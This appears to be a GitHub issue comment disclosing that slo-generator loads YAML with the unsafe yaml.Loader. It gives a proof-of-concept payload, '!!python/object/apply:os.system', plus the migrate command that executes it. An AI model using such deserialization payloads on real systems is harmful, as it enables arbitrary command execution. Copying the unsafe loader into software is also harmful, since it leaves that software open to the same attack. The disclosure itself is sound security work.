### @ocervell **[ocervell](/ocervell)** commented [Sep 29, 2021](#issue-1010564828)

`yaml.Loader` is subject to code execution using a specially formatted YAML file (`exploit.yml`):

```
!!python/object/apply:os.system ["id,whoami"]
```

and the following command:

```
slo-generator migrate -b exploit.yml

```
